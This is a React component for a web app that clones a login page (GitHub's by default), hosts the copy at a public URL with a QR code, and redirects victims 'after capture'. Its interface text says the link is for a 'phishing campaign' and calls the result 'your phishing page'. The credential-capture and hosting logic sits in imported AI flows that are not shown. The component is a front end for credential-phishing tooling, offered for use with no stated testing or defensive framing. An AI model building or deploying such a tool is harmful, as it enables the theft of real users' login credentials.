
'use client';

import { useState } from 'react';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '@/components/ui/card';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage, FormDescription } from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Loader2, AlertTriangle, Link as LinkIcon, Download, RefreshCw, Bot, Globe } from 'lucide-react';
import { cloneLoginPage, type PageClonerOutput } from '@/ai/flows/page-cloner-flow';
import { hostClonedPage, type HostClonedPageOutput } from '@/ai/flows/host-cloned-page-flow';
import { useToast } from '@/hooks/use-toast';
import { QrCodeGenerator } from './qr-code-generator';
import { Label } from './ui/label';

const pageClonerSchema = z.object({
  targetUrl: z.string().url({ message: 'Please enter a valid URL to clone.' }),
  redirectUrl: z.string().url({ message: 'Please enter a valid URL for redirection.' }),
});

export function LoginPageCloner() {
  const { toast } = useToast();
  const [clonedHtml, setClonedHtml] = useState<string | null>(null);
  const [hostedPage, setHostedPage] = useState<HostClonedPageOutput | null>(null);
  
  const [isCloning, setIsCloning] = useState(false);
  const [isHosting, setIsHosting] = useState(false);
  
  const [clonerError, setClonerError] = useState<string | null>(null);

  const form = useForm<z.infer<typeof pageClonerSchema>>({
    resolver: zodResolver(pageClonerSchema),
    defaultValues: {
      targetUrl: 'https://github.com/login',
      redirectUrl: 'https://github.com/password_reset',
    },
  });

  async function onClonerSubmit(values: z.infer<typeof pageClonerSchema>) {
    setIsCloning(true);
    setClonedHtml(null);
    setHostedPage(null);
    setClonerError(null);
    try {
      const response = await cloneLoginPage(values);
      setClonedHtml(response.htmlContent);
      toast({ title: "Page Cloned Successfully", description: "A static copy of the page has been created." });
    } catch (err) {
      const errorMessage = err instanceof Error ? err.message : 'An unknown error occurred.';
      setClonerError(errorMessage);
      console.error(err);
    } finally {
      setIsCloning(false);
    }
  }

  const handleHostPage = async () => {
    if (!clonedHtml) return;
    setIsHosting(true);
    setHostedPage(null);
    setClonerError(null);
    try {
      const response = await hostClonedPage({ htmlContent: clonedHtml });
      setHostedPage(response);
      toast({ title: "Page is Live", description: "Your page is now accessible at the public URL." });
    } catch (err) {
       const errorMessage = err instanceof Error ? err.message : 'An unknown error occurred.';
       setClonerError(errorMessage);
       console.error(err);
    } finally {
      setIsHosting(false);
    }
  };

  const handleDownloadHtml = () => {
    if (clonedHtml) {
      const blob = new Blob([clonedHtml], { type: 'text/html' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = 'cloned_login.html';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
      toast({ title: "Download Started", description: "Your cloned HTML file is downloading." });
    }
  }

  return (
    <div className="grid lg:grid-cols-5 gap-6">
      <div className="lg:col-span-2 space-y-6">
        <Card>
          <CardHeader>
            <CardTitle>Page Cloner & Host</CardTitle>
            <CardDescription>Create a static clone of a login page and host it on a public URL.</CardDescription>
          </CardHeader>
          <CardContent>
            <Form {...form}>
              <form onSubmit={form.handleSubmit(onClonerSubmit)} className="space-y-4">
                <FormField control={form.control} name="targetUrl" render={({ field }) => ( <FormItem> <FormLabel>1. Target URL to Clone</FormLabel> <FormControl><Input placeholder="https://example.com/login" {...field} /></FormControl> <FormMessage /> </FormItem> )}/>
                <FormField control={form.control} name="redirectUrl" render={({ field }) => ( <FormItem> <FormLabel>2. Redirect URL (after capture)</FormLabel> <FormControl><Input placeholder="https://example.com/login_failed" {...field} /></FormControl> <FormMessage /> </FormItem> )}/>
                <Button type="submit" disabled={isCloning} className="w-full">
                  {isCloning ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <RefreshCw className="mr-2 h-4 w-4" />}
                  Clone Page Content
                </Button>
              </form>
            </Form>
          </CardContent>
          {clonedHtml && (
            <CardFooter className="flex-col gap-4">
              <Button onClick={handleHostPage} disabled={isHosting} className="w-full">
                  {isHosting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Globe className="mr-2 h-4 w-4" />}
                  3. Host Page
              </Button>
              <Button onClick={handleDownloadHtml} variant="outline" className="w-full">
                  <Download className="mr-2 h-4 w-4"/> Download HTML
              </Button>
            </CardFooter>
          )}
        </Card>
        {clonerError && <Card className="border-destructive/50"><CardHeader><div className="flex items-center gap-3"><AlertTriangle className="h-6 w-6 text-destructive" /><CardTitle className="text-destructive">Action Failed</CardTitle></div></CardHeader><CardContent><p>{clonerError}</p></CardContent></Card>}
        
        {hostedPage && (
          <QrCodeGenerator url={hostedPage.publicUrl} />
        )}
      </div>

      <div className="lg:col-span-3">
        <Card className="min-h-[400px]">
          <CardHeader>
            <CardTitle>Hosted Page Information</CardTitle>
            <CardDescription>Use the public URL for your phishing campaign. Open it in a new tab to test.</CardDescription>
          </CardHeader>
          <CardContent className="w-full">
            {(isCloning || isHosting) && <div className="flex items-center justify-center h-96"><Loader2 className="h-8 w-8 animate-spin text-muted-foreground" /></div>}
            
            {!clonedHtml && !isCloning && (
                <div className="h-96 flex flex-col items-center justify-center text-muted-foreground">
                    <Bot className="h-12 w-12 mb-4" />
                    <p>Clone a page to get started.</p>
                </div>
            )}
            
            {clonedHtml && !hostedPage && !isHosting && (
                <div className="h-96 flex flex-col items-center justify-center text-muted-foreground">
                    <Globe className="h-12 w-12 mb-4" />
                    <p>Page cloned successfully.</p>
                    <p className="font-semibold">Click "Host Page" to get a shareable link.</p>
                </div>
            )}

            {hostedPage && (
              <div className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="public-url">Hosted Page URL</Label>
                  <Input id="public-url" readOnly value={hostedPage.publicUrl} className="font-mono"/>
                  <FormDescription>This is a publicly accessible, shareable link to your phishing page.</FormDescription>
                </div>
              </div>
            )}
          </CardContent>
        </Card>
      </div>
    </div>
  );
}
